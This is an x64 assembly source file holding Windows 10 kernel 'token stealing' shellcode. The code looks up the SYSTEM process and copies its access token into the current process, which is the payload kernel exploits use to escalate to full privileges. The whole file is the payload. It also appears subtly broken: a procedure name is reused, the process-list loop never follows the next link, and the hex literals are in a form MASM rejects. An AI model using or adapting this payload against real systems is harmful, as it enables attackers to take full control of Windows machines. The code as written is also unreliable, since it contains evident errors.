_DATA SEGMENT
_DATA ENDS

_TEXT    SEGMENT

;;;
;;; Copy the system token to the current process
;;;

PUBLIC CopySystemToken
CopySystemToken PROC
    jmp CopySystemToken_Win10
CopySystemToken ENDP

PUBLIC CopySystemTokenLength
CopySystemToken PROC
    jmp CopySystemTokenLength_Win10
CopySystemTokenLength ENDP


;;;
;;; OS specific shellcodes
;;;

PUBLIC CopySystemToken_Win10
CopySystemToken_Win10 PROC
	push rax
	push rbx
	push rcx

    ;;; nt!PsGetCurrentProcess
	mov rax, gs:[0x0188]
	mov rax, [rax+0x00b8]
	mov rbx, rax
	mov rbx, [rbx+0x02f0]

    ;;; look for SYSTEM EProcess
    __loop:
    sub rbx, 0x02f0
    mov rcx, [rbx+0x02e8]
    cmp rcx, 4
    jnz __loop

    ;;; get its token value
    mov rcx, [rbx + 0x0360]
    and cl, 0xf0

	;;; overwrite our current process' token with it
    mov [rax + 0x0360], rcx
    pop rcx
    pop rbx
    pop rax
    add rsp, 0x28
    xor rax, rax
    ret
CopySystemToken_Win10 ENDP
CopySystemToken_Win10_end::

PUBLIC CopySystemTokenLength_Win10
CopySystemTokenLength_Win10 PROC
  mov rax, OFFSET CopySystemToken_Win10_end
  mov rcx, OFFSET CopySystemToken_Win10
  sub rax, rcx
  ret
CopySystemTokenLength_Win10 ENDP

_TEXT    ENDS
END
